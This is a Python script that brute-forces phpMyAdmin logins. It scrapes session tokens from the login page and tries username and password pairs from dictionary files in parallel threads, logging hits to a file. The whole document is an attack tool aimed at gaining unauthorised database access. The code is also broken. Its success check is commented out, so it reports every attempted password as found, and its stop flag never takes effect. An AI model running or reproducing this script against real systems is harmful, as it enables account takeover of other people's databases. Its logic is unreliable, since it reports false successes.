#!/usr/bin/env python3
from ast import arg
from concurrent.futures import thread
import sys
import requests
import html
import re
import os
import argparse
import threading, time

stop_flag = 0

def login(url, username, password):
	
	for i in range(3):
		try:
			res = requests.get(url)
			cookies = dict(res.cookies)
			data = {
				'set_session': html.unescape(re.search(r"name=\"set_session\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'token': html.unescape(re.search(r"name=\"token\" value=\"(.+?)\"", res.text, re.I).group(1)),
				'pma_username': username,
				'pma_password': password,
			}
			res = requests.post(url, cookies=cookies, data=data)
			cookies = dict(res.cookies)
			#return 'pmaAuth-1' in cookies
			print("[*] FOUND - %s / %s" % (username, password))
			f = open("found.txt", "w")
			f.write("%s / %s\n" % (username, password))
			f.close()
			stop_flag = 1
		except:
			pass
	print("[!] FAILED - %s / %s" % (username, password))


def bruteforce(users, passwords, url):
	for user in users:
		for password in passwords:
			try:
				if stop_flag == 1:
					t.join()
					exit()
				t = threading.Thread(target = login, args = (url, user, password))
				t.start()	
				time.sleep(0.2)
			except KeyboardInterrupt: 
				t.join()
				print("Cancelling")
				exit()
				
		t.join()	
	
				

def main():
	parser = argparse.ArgumentParser(description='e.g. python3 %s -url http://example.com/pma/ -user root -dict password.txt' % (os.path.basename(__file__)))
	parser.add_argument('-url', help='The URL of target website')
	parser.add_argument('-user', default='root', help='The username of MySQL (default: root)')
	parser.add_argument('-udict', default='none.txt', help='The file path of username dictionary (default: NULL)')
	parser.add_argument('-pdict', default='password.txt', help='The file path of password dictionary (default: password.txt)')

	args = parser.parse_args()
	url = args.url
	pwdDictionary = args.pdict
	userDictionary = args.udict

	if url is None:
		parser.print_help()
		return

	#Getting passwords
	try:
		f = open(pwdDictionary, "r")
		passwords = re.split("[\r\n]+", f.read())
		f.close()
	except:
		print("[-] Failed to read '%s' file." % (pwdDictionary))
		return

	#Getting users
	try:
		f = open(userDictionary, "r")
		users = re.split("[\r\n]+", f.read())
		f.close()
	except:
		users = [args.user]
	
	bruteforce(users, passwords, url)


if __name__ == '__main__':
	main()
	